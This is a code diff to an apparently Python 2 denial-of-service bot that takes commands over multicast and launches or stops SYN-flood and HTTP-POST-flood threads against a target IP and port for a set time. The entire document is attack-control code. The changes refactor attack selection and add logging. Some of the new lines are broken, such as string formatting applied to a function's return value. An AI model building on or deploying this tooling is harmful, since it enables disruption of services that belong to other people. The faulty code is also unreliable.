@@ -7,6 +7,8 @@ from multicastreceiver import *
 from httppost import *
 from synflood import *
 
+aPrint = ["SYN Flood", "HTTP Flood"]
+
 def initRcvThread():
     sock = configMulticastSock()
 
@@ -31,15 +33,15 @@ def initAttack():
 
     return (aEvents, aTimes, aTimesStart, aQueues)
 
-def startAttack(n, port, ip, event, attack, time):
-    threads = attack
-    if (attack == 0):
+def startAttack(n, port, ip, event, aType, time):
+    threads = aType
+    if (aType == 0):
         threads = n
 
     event.set()
     queue = Queue.Queue(threads)
     for i in range(1, int(threads)+1):
-        if (attack == 0):
+        if (aType == 0):
             t = threading.Thread(target = synFlood, args = (i, port, ip, event,
                                                             queue))
         else:
@@ -48,33 +50,28 @@ def startAttack(n, port, ip, event, attack, time):
         t.setDaemon(True)
         t.start()
         queue.put(i)
-    reply = "SYN Flood attack started with %s attach units" % (n)
-    if (attack == 1):
-        reply = "HTTP Post attack started with %s attach units" % (n)
+
+    reply = "%s attack started with %s attach units" % (aPrint[aType], n)
+
     if (time > 0):
         reply += " and will last for %s seconds" % (time)
 
     setReply(reply)
     return queue
 
-def stopAttack(event, queue, attack):
+def stopAttack(event, queue, aType):
     event.clear()
     queue.join()
-    reply = "SYN Flood attack stoped"
-    if (attack == 1):
-        reply = "HTTP Post attack stoped"
+    reply = "%s attack stoped" % (aPrint[aType])
     setReply(reply)
 
 def checkTime(aEvents, aTimes, aTimesStart, aQueues):
     for i in range(0, 1):
-        attack = 'SYN Flood'
-        if (i > 0):
-            attack = 'HTTP Post'
-        if (aTimes[0] > 0) & ((time.time() - aTimesStart[0]) > aTimes[0]):
+        if (aTimes[i] > 0) & ((time.time() - aTimesStart[i]) > aTimes[i]):
             print "[SERVO] Finishing %s (lasted for %s seconds)...\n" %\
-                  (attack, aTimes[0])
-            stopAttack(aEvents[0], aQueues[0], 0)
-            aTimes[0] = -1
+                  (aPrint[i], aTimes[i])
+            stopAttack(aEvents[i], aQueues[i], i)
+            aTimes[i] = -1
 
 ################################### INICIO ##################################### 
 if __name__ == '__main__':
@@ -91,24 +88,36 @@ if __name__ == '__main__':
         body = getBody()
         words = body.split(';')
 
-        aFlag = 0
+        aType = 0
         if words[0] == 'http-post':
-            aFlag = 1
+            aType = 1
 
         if words[1] == 'start':
             try:
+                print "[SERVO] Start requested for %s. Starting threads...\n" %\
+                      (aPrint[aType])
+                if (aEvents[aType].is_set()):
+                    setReply("%s Attack already started") % (aPrint[aType])
+                    
                 if (len(words) > 5):
-                    t = aTimes[aFlag] = int(words[5])
-                    aTimesStart[aFlag] = time.time()
-                    aQueues[aFlag] = startAttack(words[2], words[3], words[4],
-                                                 aEvents[aFlag], aFlag, t)
+                    t = aTimes[aType] = int(words[5])
+                    aTimesStart[aType] = time.time()
+                    aQueues[aType] = startAttack(words[2], words[3], words[4],
+                                                 aEvents[aType], aType, t)
                 else:
-                    aQueues[aFlag] = startAttack(words[2], words[3], words[4],
-                                                 aEvents[aFlag], aFlag, -1)
+                    aQueues[aType] = startAttack(words[2], words[3], words[4],
+                                                 aEvents[aType], aType, -1)
             except:
-                setReply("Failed to initialize attack threads")
+                setReply("Failed to initialize %s attack threads") %\
+                        (aPrint[aType])
         else:
-            stopAttack(aEvents[aFlag], aQueues[aFlag], aFlag)
+            if (aEvents[aType].is_set()):
+                print "[SERVO] Stop requested for %s. Stopping threads...\n" %\
+                      (aPrint[aType])
+                stopAttack(aEvents[aType], aQueues[aType], aType)
+            else:
+                setReply("%s Attack already stoped" % (aPrint[aType]))
+
         
         eRead.set()
         eMsg.clear()
